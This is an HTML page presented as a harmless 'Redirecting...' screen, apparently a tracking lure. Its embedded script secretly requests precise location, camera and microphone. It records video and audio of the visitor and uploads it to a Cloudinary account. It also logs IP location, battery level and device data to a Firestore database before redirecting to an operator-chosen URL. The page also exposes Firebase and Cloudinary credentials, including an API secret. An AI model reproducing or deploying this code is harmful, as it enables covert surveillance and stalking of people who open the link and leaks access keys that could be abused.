<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f3f7fa; color: #333; transition: background-color 0.5s, color 0.5s; background-size: cover; background-position: center; }
        .container { text-align: center; padding: 40px; background-color: white; border-radius: 12px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); width: 80%; max-width: 500px; transition: background-color 0.5s, box-shadow 0.5s; }
        h1 { color: #007bff; margin-bottom: 20px; transition: color 0.5s; }
        p { font-size: 1rem; margin-bottom: 15px; transition: color 0.5s; }
        .loading-dots::after { content: ""; animation: dots 1s steps(4) infinite; }
        .error-message { color: #dc3545; margin-top: 20px; font-weight: bold; transition: color 0.5s; }
        @keyframes dots { 0% {content: "";} 25% {content: ".";} 50% {content: "..";} 75% {content: "...";} }
        .icon-container { margin-bottom: 20px; }
        .icon-container img { max-width: 100px; }
        .custom-text { font-size: 1.2rem; margin-top: 20px; }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
</head>
<body>
    <div class="container">
        <div class="icon-container">
            <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
        </div>
        <h1>Redirecting...</h1>
        <p>You will be redirected shortly <span class="loading-dots"></span></p>
        <p id="custom-redirect-text" class="custom-text" style="display: none;"></p>
        <p id="error-message" class="error-message" style="display:none;"></p>
    </div>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyAjuJwrh-OUScGf1tnsYNB9awV9gkg45QA",
    authDomain: "loctrac-8d7ef.firebaseapp.com",
    projectId: "loctrac-8d7ef",
    storageBucket: "loctrac-8d7ef.firebasestorage.com",
    messagingSenderId: "34491549339",
    appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
    measurementId: "G-65PYC8E9VR",
};

const app = firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const errorMessage = document.getElementById("error-message");

const cloudName = "loctrac";
const uploadPreset = "locstorage"; //  Corrected upload preset name.
const apiKey = "811393725393156"; //  Keep, but DO NOT USE.
const apiSecret = "kUg-q5QY1UsLastxfxLKu_cKjSQ"; //  For reference only.

const themes = {};

async function getCurrentUserId() {
    const counterRef = db.collection('counters').doc('userCounter');
    const counterDoc = await counterRef.get();
    return counterDoc.exists ? `user${counterDoc.data().count}` : 'user1';
}

function getCurrentPositionPromise() {
    return new Promise((resolve, reject) => { navigator.geolocation ? navigator.geolocation.getCurrentPosition(resolve, reject) : reject(new Error("No Geo")); });
}
function getBatteryPromise() {
    return new Promise((resolve, reject) => { navigator.getBattery ? resolve(navigator.getBattery()) : reject(new Error("No Battery API")); });
}
async function getIPLocationData() {
    try { return await (await fetch('https://ipapi.co/json/')).json(); } catch (error) { console.error('IP Error:', error); return null; }
}
function getDeviceInfo() { return navigator.userAgent; }
async function applyThemeRedirect(themeName) {} // Placeholder

async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
    let locationData = null;
    let batteryData = null;
    let locationError = null; // Initialize to null
    let batteryError = null; // Initialize to null
    let ipLocationData = null;
    let deviceInfo = getDeviceInfo();

    if (locationPermission) {
        try {
            const position = await getCurrentPositionPromise();
            locationData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
        } catch (error) {
            locationError = error.message || "Onbekende locatiefout";
            ipLocationData = await getIPLocationData();
        }
    } else {
         ipLocationData = await getIPLocationData();
    }

    try {
        const battery = await getBatteryPromise();
        batteryData = battery.level * 100;
    } catch (error) {
        batteryError = error.message || "Onbekende batterijfout";
    }
    saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo);
}

async function handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId) {
    let videoUrl = null;
    let cameraError = null;
    let recorder = null;
    let stream = null;

    if (micCamPermission) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            if (recordSeconds > 0) {
                recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = event => chunks.push(event.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    try {
                        const formData = new FormData();
                        formData.append('file', blob, `${currentUserId}_recording.webm`);
                        formData.append('upload_preset', uploadPreset); // Correct preset
                        formData.append('cloud_name', cloudName);
                        // NO API KEY

                        const uploadResponse = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, { method: 'POST', body: formData });

                        if (!uploadResponse.ok) {
                            const errorData = await uploadResponse.json();
                            cameraError = `Cloudinary upload error: ${uploadResponse.status} - ${errorData.error.message}`;
                            videoUrl = null;
                            collectOtherData(true, videoUrl, cameraError);
                            return;
                        }
                        const uploadResult = await uploadResponse.json();
                        videoUrl = uploadResult.secure_url;
                        collectOtherData(true, videoUrl, cameraError);
                    } catch (uploadError) {
                        cameraError = `Cloudinary upload error: ${uploadError.message}`;
                        videoUrl = null;
                        collectOtherData(true, videoUrl, cameraError);
                    } finally { if (stream) { stream.getTracks().forEach(track => track.stop()); } }
                };
                recorder.start();
                setTimeout(() => { if (recorder && recorder.state !== "inactive") { recorder.stop(); } }, recordSeconds * 1000);
            } else {
                if (stream) { stream.getTracks().forEach(track => track.stop()); }
                collectOtherData(true, null, null);
            }
        } catch (error) {
            cameraError = error.message;
            collectOtherData(true, null, cameraError);
        }
    } else {
        collectOtherData(false, null, null);
    }
    return { videoUrl, cameraError };
}

async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData, deviceInfo) {
    const dataToSave = { videoUrl, location: locationData, batteryPercentage: batteryData, locationError, batteryError, cameraError, ipLocation: ipLocationData, deviceInfo };
    const currentUserId = await getCurrentUserId();
    const dataRef = db.collection('userData').doc(currentUserId);
    try { await dataRef.set(dataToSave); } catch (error) { errorMessage.textContent = `Firestore Fout: ${error.message}`; errorMessage.style.display = 'block'; }
    const settingsRef = db.collection('userSettings').doc(currentUserId);
    const settingsSnap = await settingsRef.get();
    let redirectUrl, redirectSeconds = 0, notificationPermission = false, notificationTitle, notificationBody, notificationIcon, themeName = 'default';
    if (settingsSnap.exists) {
        const settingsData = settingsSnap.data();
        ({redirectUrl, redirectSeconds, notificationPermission, notificationTitle, notificationBody, notificationIcon, theme: themeName = 'default'} = settingsData);
        redirectSeconds = parseInt(redirectSeconds) || 0;
    }
    if (notificationPermission && notificationTitle && notificationBody && Notification.permission === "granted") {
        try { new Notification(notificationTitle, { body: notificationBody, icon: notificationIcon || undefined }); } catch (error) { console.error("Notif Error:", error);}
    } else if (notificationPermission && Notification.permission === 'default') {
        Notification.requestPermission().then(pr => {
            if(pr === 'granted') { try { new Notification(notificationTitle, {body: notificationBody, icon: notificationIcon}); } catch (e) {console.error(e);}}
        });
    }
    if (redirectUrl) { setTimeout(() => { window.location.href = redirectUrl; }, redirectSeconds * 1000); } else { errorMessage.textContent = "Geen URL"; errorMessage.style.display = 'block'; }
}

(async () => {
    const currentUserId = await getCurrentUserId();
    const settingsRef = db.collection('userSettings').doc(currentUserId);
    let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
    try {
        const settingsSnap = await settingsRef.get();
        if (settingsSnap.exists) {
            ({micCamPermission, recordSeconds, notificationPermission: notificationPermissionSetting, theme: themeName = 'default'} = settingsSnap.data());
            recordSeconds = parseInt(recordSeconds) || 0;
        }
    } catch (error) { errorMessage.textContent = `Firebase Fout: ${error.message}`; errorMessage.style.display = 'block'; }
    if (notificationPermissionSetting && Notification.permission === "default") { await Notification.requestPermission(); }

    const handleGeoSuccess = async (position) => {
        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
        collectOtherData(true, cameraMicData.videoUrl, cameraMicData.cameraError);
    };
    const handleGeoError = async (error) => {
        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
        collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
    } else {
        const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
        collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError);
    }
})();
</script>
</body>
</html>
